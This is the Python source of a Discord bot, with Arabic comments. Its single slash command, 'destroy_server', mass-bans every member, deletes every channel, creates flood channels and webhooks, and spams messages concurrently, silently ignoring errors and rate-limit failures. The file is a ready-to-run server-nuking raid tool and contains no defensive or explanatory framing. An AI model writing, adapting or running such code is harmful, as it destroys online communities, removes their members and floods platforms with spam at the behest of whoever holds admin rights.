import os
import asyncio
import discord
from discord import app_commands
from discord.ext import commands


class MyBot(commands.Bot):

    def __init__(self):
        intents = discord.Intents.default()
        intents.guilds = True
        intents.guild_messages = True
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print("تم مزامنة أوامر السلاش بنجاح.")


bot = MyBot()


@bot.event
async def on_ready():
    print(f"تم تسجيل الدخول باسم: {bot.user}")


# دالة إرسال السبام للويب هوك بسرعة عالية
async def send_webhook_spams(
    webhook: discord.Webhook, message: str, count: int
):
    tasks = [webhook.send(content=message) for _ in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)


@bot.tree.command(
    name="destroy_server",
    description="أمر التدمير الفوري المتزامن بالكامل بدون أي انتظار",
)
@app_commands.describe(
    room_name="اسم الرومات الجديدة (بدون أرقام)",
    rooms_count="عدد الرومات المراد إنشاؤها",
    webhook_name="اسم الويب هوك",
    message_content="محتوى رسالة السبام",
    messages_count="عدد الرسائل في كل روم",
)
async def destroy_server(
    interaction: discord.Interaction,
    room_name: str,
    rooms_count: int,
    webhook_name: str,
    message_content: str,
    messages_count: int,
):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "يجب أن تكون مشرفاً لاستخدام هذا الأمر.", ephemeral=True
        )
        return

    await interaction.response.send_message(
        "جاري إطلاق العملية الفورية الشاملة...", ephemeral=True
    )
    guild = interaction.guild

    # 1. حظر الأعضاء كلهم مع بعض دفعة واحدة
    async def ban_member(member):
        if member.id == bot.user.id or member.id == interaction.user.id:
            return
        try:
            await guild.ban(member, reason="تدمير السيرفر")
        except:
            pass

    ban_tasks = [ban_member(m) for m in guild.members]

    # 2. حذف كل الرومات القديمة دفعة واحدة وبشكل تزامني كامل
    channels_to_delete = [
        c for c in guild.channels if c.id != interaction.channel.id
    ]

    async def delete_single(ch):
        try:
            await ch.delete()
        except:
            pass

    delete_tasks = [delete_single(ch) for ch in channels_to_delete]

    # 3. إنشاء كل الرومات، الويب هوكات، وإرسال الرسائل فوراً معاً
    category = interaction.channel.category
    created_channels = []

    async def create_and_spam(i):
        try:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(
                    send_messages=True, view_channel=True
                )
            }
            if category:
                channel = await guild.create_text_channel(
                    room_name, category=category, overwrites=overwrites
                )
            else:
                channel = await guild.create_text_channel(
                    room_name, overwrites=overwrites
                )

            created_channels.append(channel)
            
            # إنشاء الويب هوك
            webhook = await channel.create_webhook(name=webhook_name)
            
            # إرسال الرسائل فوراً بدون أي تأخير زمني يذكر
            await send_webhook_spams(webhook, message_content, messages_count)
        except:
            pass

    create_tasks = [create_and_spam(i) for i in range(1, rooms_count + 1)]

    # إطلاق كل شيء في ثانية واحدة مطلقة (الحذف، الباند، الإنشاء والسبام)
    await asyncio.gather(
        asyncio.gather(*ban_tasks, return_exceptions=True),
        asyncio.gather(*delete_tasks, return_exceptions=True),
        asyncio.gather(*create_tasks, return_exceptions=True),
        return_exceptions=True,
    )

    # حذف الروم الحالي بالآخر
    try:
        await interaction.channel.delete()
    except:
        pass


MASTERGUARD_TOKEN = os.environ.get('MASTERGUARD_TOKEN')
bot.run(MASTERGUARD_TOKEN)
